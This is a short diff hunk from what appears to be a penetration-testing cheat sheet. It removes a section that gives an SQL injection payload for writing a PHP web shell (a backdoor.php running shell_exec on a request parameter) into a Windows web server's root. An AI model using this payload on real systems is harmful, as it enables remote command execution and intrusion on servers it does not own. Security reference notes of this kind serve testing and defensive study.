@@ -846,12 +846,6 @@ Injection: Verified!
 Press [Enter] to continue...
 ```
 
-###### SQL Databases
-RCE upload through SQL injection in a Windows Web server
-```
-'; select "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE 'C:/Inetpub/wwwroot/backdoor.php';#
-```
-
 ###### Ebowla
 
 ### WinRM
